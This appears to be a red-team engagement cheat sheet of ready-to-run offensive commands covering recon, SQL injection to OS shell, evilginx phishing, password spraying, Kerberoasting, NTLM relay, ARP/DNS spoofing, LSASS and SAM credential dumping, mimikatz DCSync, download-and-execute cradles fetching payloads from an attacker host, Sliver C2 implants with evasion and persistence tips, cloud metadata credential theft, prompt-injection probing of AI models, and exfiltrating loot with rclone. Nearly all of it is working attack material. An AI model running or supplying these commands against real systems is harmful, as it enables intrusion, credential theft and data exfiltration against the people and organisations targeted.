# Quick reference: the 150 commands you will actually type

Density over prose. Each block points at the reference file that explains flags, OPSEC
and pitfalls. Assume `$T` = target, `$D` = domain, `$U/$P` = creds, `$H` = NTLM hash,
`$DC` = domain controller IP.

```bash
# --- one-time shell setup ---
export T=target.example D=target.example DC=10.10.10.5
export OUT=~/eng/$(date +%F)/; mkdir -p $OUT/{recon,evidence,loot,payloads}
exec > >(tee -a $OUT/ops-log.md) 2>&1        # everything logged from here
date -u; curl -s ifconfig.me                  # clock + source IP
```

## Recon (see 01-recon-and-asm.md)

```bash
subfinder -d $D -all -silent | dnsx -silent -a -resp | tee $OUT/recon/ips.txt
amass enum -passive -d $D -o $OUT/recon/amass.txt
curl -s "https://crt.sh/?q=%25.$D&output=json" | jq -r '.[].name_value' | sort -u
cat $OUT/recon/ips.txt | httpx -silent -title -tech-detect -status-code -o $OUT/recon/live.txt
katana -list $OUT/recon/live.txt -d 3 -jc -rl 100 -o $OUT/recon/urls.txt
ffuf -w ~/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://$T/FUZZ -mc 200,204,301,302,401,403 -rate 80
feroxbuster -u https://$T -w ~/seclists/Discovery/Web-Content/raft-medium-files.txt --depth 2 --smart
nuclei -l $OUT/recon/live.txt -severity critical,high -rl 120 -stats=false -o $OUT/recon/nuclei.txt
nuclei -l $OUT/recon/live.txt -t exposures/ -t takeovers/ -rl 100
trufflehog github --org=<org> --only-verified
shodan search 'ssl.cert.subject.CN:"$D"' --fields ip_str,port,hostnames
shodan host <ip>; shodan count 'product:nginx country:CA'
nmap -sS -Pn -p- --min-rate 4000 -oA $OUT/recon/allports <ip>
nmap -sV -sC -p 21,22,25,80,443,445,1433,3306,3389,5985,8080 -oA $OUT/recon/svcs <ip>
whatweb -a 3 https://$T
```

## Web exploitation and fuzzing

```bash
sqlmap -u "https://$T/x?id=1" --batch --dbs --risk 3 --level 3
sqlmap -r req.txt --batch --os-shell
ffuf -w params.txt -u "https://$T/api?FUZZ=1" -fs 1234
ffuf -w vhosts.txt -u https://$T -H "Host: FUZZ.$D" -fs 4242
curl -s https://$T/.git/HEAD; git-dumper https://$T/.git/ $OUT/loot/git
curl -s https://$T/.env; curl -s https://$T/actuator/env; curl -s https://$T/swagger.json
```

## Phishing and AitM (see 10-credentials-cracking-and-phishing.md)

```bash
gophish            # :3333 UI, API key in settings
evilginx2 -p ~/phishlets -developer
# in evilginx: config domain $D; config ipv4 <vps-ip>; phishlets hostname o365 login.$D
#              phishlets enable o365; lures create o365; lures get-url 0
credmaster --plugin azure --userfile users.txt --passfile 'Summer2026!' --proxy-urls proxies.txt --threads 10
```

## Credential capture and cracking (see 10-…, 13-network-and-protocol-attacks.md)

```bash
responder -I eth0 -A                      # analyse only
responder -I eth0 -wdv                    # poison LLMNR/NBT-NS/mDNS
hashcat -m 5600 netntlmv2.txt rockyou.txt -O -w 4 -r rules/OneRuleToRuleThemAll.rule
hashcat -m 13100 kerberoast.txt rockyou.txt -O
hashcat -m 18200 asrep.txt rockyou.txt -O
hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?l?d?d?d?d
john --format=NT ntlm.txt --wordlist=rockyou.txt --rules
kerbrute userenum -d $D --dc $DC users.txt
kerbrute passwordspray -d $D --dc $DC users.txt 'Summer2026!'
```

## AD enumeration and attack (see 02-active-directory-windows.md)

```bash
nxc smb $DC -u $U -p $P --shares --sessions --loggedon-users
nxc smb 10.10.10.0/24 -u $U -p $P --gen-relay-list $OUT/recon/relay.txt
nxc ldap $DC -u $U -p $P --users --groups --admin-count --trusted-for-delegation
nxc ldap $DC -u $U -p $P --bloodhound --collection All --dns-server $DC
nxc smb $DC -u $U -H $H --local-auth
nxc winrm $T -u $U -p $P -x whoami
nxc mssql $T -u $U -p $P -q "select @@version"
impacket-GetUserSPNs $D/$U:$P -dc-ip $DC -request -outputfile $OUT/loot/kerb.txt
impacket-GetNPUsers $D/ -usersfile users.txt -dc-ip $DC -request
impacket-secretsdump $D/$U:$P@$T -just-dc-ntlm
impacket-psexec $D/$U:$P@$T
impacket-wmiexec $D/$U:$P@$T 'whoami /priv'
evil-winrm -i $T -u $U -p $P
certipy find -u $U@$D -p $P -dc-ip $DC -vulnerable
certipy req -u $U@$D -p $P -ca CORP-CA -template VulnTemplate -upn administrator@$D
certipy auth -pfx administrator.pfx -dc-ip $DC
python3 bloodhound.py -u $U -p $P -d $D -ns $DC -c All
rubeus.exe kerberoast /outfile:kerb.txt
rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
rubeus.exe ptt /ticket:base64ticket
coercer coerce -u $U -p $P -d $D -l $T --dc-ip $DC
snaffler.exe -s -d $D -o $OUT/loot/snaffler.log
pingcastle.exe --healthcheck --server $DC --user $U --password $P
```

## Relay and MITM (see 13-network-and-protocol-attacks.md)

```bash
ntlmrelayx.py -tf $OUT/recon/relay.txt -smb2support -socks
ntlmrelayx.py -t ldaps://$DC -smb2support --delegate-access --escalate-user $U
ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
sudo bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'
sudo bettercap -iface eth0 -eval 'set dns.spoof.domains *.$D; dns.spoof on'
sudo tcpdump -i eth0 -nn -w $OUT/evidence/cap.pcap 'port 445 or port 389'
tshark -r cap.pcap -Y 'ntlmssp' -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain
```

## Foothold, privesc, evasion (see 06-evasion-and-postex.md)

```bash
winPEASx64.exe quiet > %TEMP%\w.txt
linpeas.sh -a | tee /tmp/l.txt
whoami /priv; whoami /groups; systeminfo
certutil -urlcache -f http://$LH/a.exe %TEMP%\a.exe
powershell -w hidden -c "iwr http://$LH/r.ps1 -useb | iex"
rundll32 comsvcs.dll, MiniDump <pid> C:\Windows\Temp\m.dmp full
reg save HKLM\SAM sam.hiv & reg save HKLM\SYSTEM sys.hiv & reg save HKLM\SECURITY sec.hiv
mimikatz.exe "sekurlsa::logonpasswords" "lsadump::dcsync /user:krbtgt" exit
nanodump.exe --write --pid <lsass_pid> --symbols
lazagne.exe all
```

## C2 and pivoting (see 03-c2-and-tunneling.md)

```bash
sliver-server
# console:
mtls --lhost <ip> --lport 8888
generate --mtls <ip>:8888 --os windows --arch amd64 --save /tmp/
implants
wg --lport 51820
http --lhost <ip> --lport 80 --domain $D
beacons; use <id>; ps; migrate <pid>; execute-assembly Seatbelt.exe -group=all
socks5 start 1080
portfwd add -r 127.0.0.1:3389 -b 127.0.0.1:13389
```
```bash
./proxy -selfcert -laddr 0.0.0.0:11601
./agent -connect <ip>:11601 -ignore-cert
# proxy console: session; ifconfig; start; listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:80
sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up
sudo ip route add 10.10.10.0/24 dev ligolo
```

## Cloud (see 04-cloud-security.md)

```bash
aws sts get-caller-identity
cloudfox aws --profile x all-checks
cloudfox aws --profile x permissions; cloudfox aws --profile x routes; cloudfox aws --profile x loot
pacu  # import_keys / run module / exec
prowler aws -c iam_* s3_* -M csv json-ocsf html
scoutsuite aws --profile x --report-dir $OUT/loot/scout
stratus detonate aws.defense-evasion.cloudtrail-stop
cloudgoat create iam_privesc_by_rollback
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
azcopy login; roadrecon auth -u $U -p $P; roadrecon gather; roadrecon dump
AzureHound -u $U -p $P -c all
```

## AI/LLM red team (see 04-cloud-security.md)

```bash
garak --list_probes; garak --model_type openai --model_name gpt-4o-mini --probes promptinject,leakreplay --report_prefix $OUT/recon/garak
promptfoo init; promptfoo eval -c cfg.yaml; promptfoo redteam run; promptfoo view
```

## Exfil and wrap-up

```bash
7z a -mx9 -p$(openssl rand -hex 16) $OUT/loot.7z $OUT/loot
rclone copy $OUT/loot.7z remote:drop --progress
sha256sum $OUT/loot.7z | tee $OUT/evidence/loot.sha256
for f in $OUT/evidence/*; do sha256sum "$f"; done > $OUT/evidence/index.sha256
```

## Sanity rules

- `-rl` means global rate, `-hrl` per host. Shared target: always set both.
- Kerberos anything: `date -u`, sync to the DC, then go. Skew > 5 min equals failed tickets and locked accounts.
- Spray: one password, many users. Confirm the lockout threshold before the second round.
- Any `nmap -p-` on a production range gets `--min-rate 4000` and a `-oA`, never a bare run.
- Check signing before a relay plan: `nxc smb --gen-relay-list` output, not vibes.
- Sleep 60s with 40% jitter on every implant, and rename it off `%TEMP%` in the first hour.
- Two persistence mechanisms, removal command written down as you create them.
